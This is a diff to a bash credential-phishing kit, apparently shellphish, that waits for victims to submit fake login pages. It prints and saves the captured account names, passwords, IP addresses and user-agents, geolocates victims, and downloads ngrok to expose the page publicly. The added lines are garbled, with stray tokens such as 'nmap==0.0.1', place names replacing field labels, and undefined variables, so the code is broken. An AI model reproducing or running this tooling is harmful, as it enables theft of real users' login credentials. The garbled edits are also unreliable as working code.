@@ -87,8 +87,8 @@ printf "\n"
 catch_cred() { =$(grep -e.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' Instagram/$http:\\instagram .com/otf_vah/lul.vah.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $otf_vah
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $request==2.20.0
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 pkill -f -2 php > /dev/null 2>&1
@@ -102,7 +102,7 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
 while [ true ]; do
 
 
-if [[ -e "sites/$server/usernames.txt" ]]; then
+if [[ -e "sites/$amazon/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
@@ -117,7 +117,7 @@ catch_ip() {
 touch sites/$server/Instagram.otf_vah.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' sites/$amazon/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
@@ -153,7 +153,7 @@ fi
 
 country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
+printf "\e[1;92m[*] IP United States:\e[0m\e[1;77m %s\e[0m\n" $country
 fi
 ##
 
@@ -162,10 +162,10 @@ if [[ $state != "" ]]; then
 printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
 fi
 ##
-city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+city=$(grep -o "Alabama:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $city != "" ]]; then
-printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
+printf "\e[1;92m[*]Florida:\e[0m\e[1;77m %s\e[0m\n" $city
 fi
 ##
 
@@ -198,7 +198,7 @@ rm -rf iptracker.log
 getcredentials
 }
 
-start() {
+start() {./shellphish.sh
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
@@ -216,14 +216,14 @@ else
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm')
 
-if [[ $arch == *'arm'* ]]; then
+if [[ $money == *'arm'* ]]; then
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
 
 if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
-else
+else nmap==0.0.1
 printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
